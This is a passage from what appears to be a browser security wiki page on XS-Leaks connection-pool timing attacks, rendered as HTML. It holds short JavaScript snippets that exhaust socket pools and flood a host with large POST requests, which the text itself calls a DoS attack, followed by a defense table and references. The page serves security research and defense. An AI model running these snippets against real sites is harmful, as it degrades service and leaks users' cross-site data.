+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> (duration <span style=color:#ff79c6>-</span> duration2 <span style=color:#ff79c6>&lt;</span> max);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>await</span> isConnected2(<span style=color:#f1fa8c>&#39;https://example.com/404&#39;</span>);
+</span></span></code></pre></div><h2 id=skipping-dependences>Skipping dependences
+<a class=anchor href=#skipping-dependences>#</a></h2><p>If a connection is exhausted or there’s to many sockets open then requests for code from a host may fail resulting in different behaviour.
+The following examples are by design a DoS attack for both the client and server.
+Open a lot of sockets: (ERR_CONNECTION_CLOSED, ERR_INSUFFICIENT_RESOURCES)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#ff79c6>for</span> (<span style=color:#8be9fd;font-style:italic>let</span> i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>500</span>; i<span style=color:#ff79c6>++</span>) request();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>async</span> <span style=color:#8be9fd;font-style:italic>function</span> request() {
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>let</span> x <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> AbortController();
+</span></span><span style=display:flex><span>    fetch(<span style=color:#f1fa8c>&#39;https://example.org&#39;</span>, {
+</span></span><span style=display:flex><span>        mode<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-cors&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#6272a4>//credentials: &#39;include&#39;,
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        cache<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-store&#34;</span>,
+</span></span><span style=display:flex><span>        signal<span style=color:#ff79c6>:</span> x.signal
+</span></span><span style=display:flex><span>    });
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>await</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd;font-style:italic>Promise</span>(r =&gt; setTimeout(r, <span style=color:#bd93f9>10</span>));
+</span></span><span style=display:flex><span>    x.abort();
+</span></span><span style=display:flex><span>    request();
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>open(<span style=color:#f1fa8c>&#39;https://example.com&#39;</span>, <span style=color:#f1fa8c>&#39;&#39;</span> , <span style=color:#f1fa8c>&#39;popup=1&#39;</span>);
+</span></span></code></pre></div><p>Overload a connection so it never requests to that host. (ERR_CONNECTION_RESET)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>let</span> x <span style=color:#ff79c6>=</span> [...<span style=color:#8be9fd;font-style:italic>Array</span>(<span style=color:#bd93f9>1000000</span>)].join(<span style=color:#f1fa8c>&#39;,&#39;</span>);
+</span></span><span style=display:flex><span>request();
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>function</span> request() {
+</span></span><span style=display:flex><span>fetch(<span style=color:#f1fa8c>&#39;https://example.com&#39;</span>, {mode<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-cors&#34;</span>, cache<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;no-store&#34;</span>, method<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#39;POST&#39;</span>, body<span style=color:#ff79c6>:</span> x}).then(request);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=defense>Defense
+<a class=anchor href=#defense>#</a></h2><table><thead><tr><th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies (Lax)</a></th><th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/opt-in/coop/>COOP</a></th><th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/opt-in/xfo/>Framing Protections</a></th><th style=text-align:center><a href=https://xsleaks.dev/docs/defenses/isolation-policies/>Isolation Policies</a></th></tr></thead><tbody><tr><td style=text-align:center>❌</td><td style=text-align:center>❌</td><td style=text-align:center>❌</td><td style=text-align:center>❌</td></tr></tbody></table><blockquote class="book-hint2 info"><p class="hint-title info"><svg class="book-icon"><use href="/svg/hint-icons.svg#info-notice"/></svg><span>info</span></p>Similar to <a href=https://xsleaks.dev/docs/defenses/secure-defaults/partitioned-cache/>partitioned caches</a>, some browsers are considering to extend the principle of &ldquo;split per site/origin&rdquo; of resources to <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1572544">socket pools</a>.</blockquote><h2 id=references>References
+<a class=anchor href=#references>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>Leak cross-window request timing by exhausting connection pool, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=843157">link</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p>client_socket_pool_manager.cc, <a href=https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool_manager.cc>link</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref2:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p>features.cc, <a href=https://source.chromium.org/chromium/chromium/src/+/main:net/base/features.cc>link</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p>rfc9113 Connection Reuse, <a href=https://httpwg.org/specs/rfc9113.html#rfc.section.9.1.1>link</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p>rfc9114 Connection Reuse, <a href=https://httpwg.org/specs/rfc9114.html#rfc.section.3.3>link</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p>HTTP/2 CONNECTION COALESCING, <a href=https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing/>link</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p>rfc9113 Remote Timing Attacks, <a href=https://httpwg.org/specs/rfc9113.html#rfc.section.10.9>link</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8><p>quic_context.h, <a href=https://source.chromium.org/chromium/chromium/src/+/main:net/quic/quic_context.h>link</a>&#160;<a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/xsleaks/wiki/commit/5a77850b3afcbc399fde4bcb15684476f16b2a27 title='Last modified by NDevTK | November 6, 2022' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
+<span>Last Modified: November 6, 2022</span></a></div><div><a class="flex align-center" href=https://github.com/xsleaks/wiki/edit/master/content//docs/attacks/timing-attacks/connection-pool.md target=_blank rel=noopener><img src=/svg/edit.svg class=book-icon alt=Edit>
+<span>Edit this article</span></a></div></div></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><nav id=TableOfContents><ul><li><a href=#connection-reuse>Connection reuse</a></li><li><a href=#skipping-dependences>Skipping dependences</a></li><li><a href=#defense>Defense</a></li><li><a href=#references>References</a></li></ul></nav></aside></main></body></html>
